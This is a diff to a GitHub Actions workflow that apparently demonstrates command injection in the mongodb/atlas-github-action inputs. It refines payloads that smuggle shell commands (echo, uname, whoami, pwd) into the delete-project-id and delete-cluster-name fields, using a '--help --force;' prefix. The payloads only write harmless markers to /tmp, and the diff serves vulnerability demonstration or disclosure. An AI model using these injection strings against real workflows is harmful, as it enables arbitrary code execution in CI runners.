@@ -19,8 +19,8 @@ jobs:
         with:
           # Injection via delete-project-id
           # Format: atlas project delete ${{ inputs.delete-project-id }} --force
-          # We put --force right after the project ID, then inject commands
-          delete-project-id: "507f1f77bcf86cd799439011 --force; echo '=== INJECTION 1: delete-project-id ===' > /tmp/injection1.txt && date >> /tmp/injection1.txt && uname -a >> /tmp/injection1.txt || true #"
+          # Using --help makes the command succeed, then our injected commands execute
+          delete-project-id: "--help --force; echo '=== INJECTION 1: delete-project-id ===' > /tmp/injection1.txt && date >> /tmp/injection1.txt && uname -a >> /tmp/injection1.txt #"
       
       - name: Demonstrate Multiple Injection Vectors - Delete Cluster
         uses: mongodb/atlas-github-action@v0.2.0
@@ -28,8 +28,8 @@ jobs:
         with:
           # Injection via delete-cluster-name
           # Format: atlas cluster delete ${{ inputs.delete-cluster-name }} --force --projectId ${{ inputs.delete-project-id }}
-          # We put --force right after the cluster name, then inject commands
-          delete-cluster-name: "test-cluster --force; echo '=== INJECTION 2: delete-cluster-name ===' > /tmp/injection2.txt && whoami >> /tmp/injection2.txt && pwd >> /tmp/injection2.txt || true #"
+          # Using --help makes the command succeed, then our injected commands execute
+          delete-cluster-name: "--help --force; echo '=== INJECTION 2: delete-cluster-name ===' > /tmp/injection2.txt && whoami >> /tmp/injection2.txt && pwd >> /tmp/injection2.txt #"
           delete-project-id: "507f1f77bcf86cd799439011"
 
       - name: Verify Injections Executed
